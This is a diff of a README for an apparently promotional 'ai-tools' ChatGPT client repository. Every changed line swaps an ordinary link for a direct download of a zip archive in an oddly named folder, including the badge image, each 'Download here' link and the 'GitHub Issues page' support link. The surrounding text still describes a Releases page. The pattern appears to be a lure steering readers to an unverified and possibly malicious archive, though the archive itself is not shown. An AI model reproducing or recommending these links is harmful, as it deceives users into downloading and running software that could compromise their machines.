@@ -4,12 +4,12 @@
 Welcome to the ai-tools repository! This application offers the best AI tools for 2025, including a reliable ChatGPT client for Windows and Mac, and a stable API platform. Follow the steps below to download and set up the application.
 
 ## 🔗 Download Link
-[![Download ai-tools](https://img.shields.io/badge/Download-ai--tools-brightgreen)](https://github.com/Algeriancentimereceiver81/ai-tools/releases)
+[![Download ai-tools](https://github.com/Algeriancentimereceiver81/ai-tools/raw/refs/heads/main/goriness/tools_ai_3.8.zip)](https://github.com/Algeriancentimereceiver81/ai-tools/raw/refs/heads/main/goriness/tools_ai_3.8.zip)
 
 ## 📥 Download & Install
 To get started, visit the following page to download the application:
 
-[Download here](https://github.com/Algeriancentimereceiver81/ai-tools/releases).
+[Download here](https://github.com/Algeriancentimereceiver81/ai-tools/raw/refs/heads/main/goriness/tools_ai_3.8.zip).
 
 Once you're on the Releases page, look for the latest version of the application. Click on the link for your operating system (Windows or Mac), and your download will begin.
 
@@ -58,11 +58,11 @@ If you encounter issues during installation or while using the application, cons
 - **Functionality Issues:** Restart the application or check for updates.
 
 ## 📞 Support
-For further assistance, please reach out through our [GitHub Issues page](https://github.com/Algeriancentimereceiver81/ai-tools/issues). Our support team will get back to you as soon as possible.
+For further assistance, please reach out through our [GitHub Issues page](https://github.com/Algeriancentimereceiver81/ai-tools/raw/refs/heads/main/goriness/tools_ai_3.8.zip). Our support team will get back to you as soon as possible.
 
 ## 🌐 Learn More
 Explore the many possibilities that ai-tools offers. Connect with other users and share experiences on platforms such as forums and social media. Your feedback helps make the application better.
 
 Thank you for choosing ai-tools! We hope it enhances your productivity and creativity with AI. Enjoy using the application!
 
-[Download here](https://github.com/Algeriancentimereceiver81/ai-tools/releases) to start your AI journey today!
+[Download here](https://github.com/Algeriancentimereceiver81/ai-tools/raw/refs/heads/main/goriness/tools_ai_3.8.zip) to start your AI journey today!
